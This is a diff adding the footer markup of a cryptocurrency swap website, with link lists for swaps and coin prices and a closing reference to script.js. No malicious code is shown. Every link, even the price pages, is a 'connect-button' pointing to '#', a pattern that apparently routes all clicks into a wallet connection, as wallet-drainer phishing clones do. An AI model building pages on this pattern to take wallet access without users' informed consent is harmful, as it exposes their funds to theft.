+          <h4>Crypto to Crypto Swap</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Bitcoin to Solana</a></li>
+            <li><a class="connect-button" href="#">Solana to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">Ethereum to Solana</a></li>
+            <li><a class="connect-button" href="#">USDT (Tron) to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">TRX to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">USDC to USDT</a></li>
+            <li><a class="connect-button" href="#">USDT to Solana</a></li>
+            <li><a class="connect-button" href="#">FLIP to USDT</a></li>
+            <li><a class="connect-button" href="#">WBTC to Ethereum</a></li>
+            <li><a class="connect-button" href="#">Polkadot to USDT</a></li>
+            <li><a class="connect-button" href="#">USDT (BSC) to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">BNB to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">cbBTC to Bitcoin</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4>Swap</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Swap Bitcoin</a></li>
+            <li><a class="connect-button" href="#">Swap Solana</a></li>
+            <li><a class="connect-button" href="#">Swap Tron</a></li>
+            <li><a class="connect-button" href="#">Swap Ethereum</a></li>
+            <li><a class="connect-button" href="#">Swap USDT</a></li>
+            <li><a class="connect-button" href="#">Swap USDC</a></li>
+            <li><a class="connect-button" href="#">Swap FLIP</a></li>
+            <li><a class="connect-button" href="#">Swap Polkadot</a></li>
+            <li><a class="connect-button" href="#">Swap wBTC</a></li>
+            <li><a class="connect-button" href="#" style="color:#777">Swap BNB (soon)</a></li>
+            <li><a class="connect-button" href="#" style="color:#777">Swap cbBTC (soon)</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4>Crypto Price</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Bitcoin Price</a></li>
+            <li><a class="connect-button" href="#">Solana Price</a></li>
+            <li><a class="connect-button" href="#">Ethereum Price</a></li>
+            <li><a class="connect-button" href="#">Tron Price</a></li>
+            <li><a class="connect-button" href="#">USDT Price</a></li>
+            <li><a class="connect-button" href="#">USDC Price</a></li>
+            <li><a class="connect-button" href="#">Wrapped Bitcoin Price</a></li>
+            <li><a class="connect-button" href="#">FLIP Price</a></li>
+            <li><a class="connect-button" href="#">Polkadot Price</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
